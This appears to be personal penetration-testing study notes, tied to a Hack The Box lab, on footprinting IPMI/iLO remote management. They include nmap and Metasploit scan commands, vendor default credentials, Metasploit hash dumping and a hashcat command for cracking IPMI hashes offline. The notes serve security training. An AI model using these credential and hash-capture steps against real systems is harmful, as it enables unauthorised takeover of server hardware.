IPMP
#######

Date: 2024-11-11 14:48

Status:


:doc:`Intelligent Platform Management Interface <https://www.thomas-krenn.com/en/wiki/IPMI_Basics>`

A remote management of hardware (ILO)

Footprinting
*************

Port
************
``623 udp``

Nmap
***********
example 1: using nmap and the ipmi-version script

.. code-block:: console

   sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Metasploit
***********

example 1: using the auxiliary/scanner/ipmi/ipmi_version module

.. code-block:: console

   msf6 > use auxiliary/scanner/ipmi/ipmi_version 
   msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
   msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 
   msf6 > run

Default Passwords
*******************

.. code-block:: console

   Dell iDRAC - root:calvin
   HP iLO  Administrator - randomized 8-character string consisting of numbers and uppercase letters
   Supermicro IPMI - ADMIN:ADMIN

Dangerous settings
*******************

Hashed passwords can be captured and cracked offline with:

.. code-block:: console

   hashcat  -m 7300 hash -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u

Hashed passwords can be captured with Metasploits
https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/
module

Example:

.. code-block:: console

   msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
   msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
   msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options
   msf6 > run

References
************
https://academy.hackthebox.com/module/112/section/1245
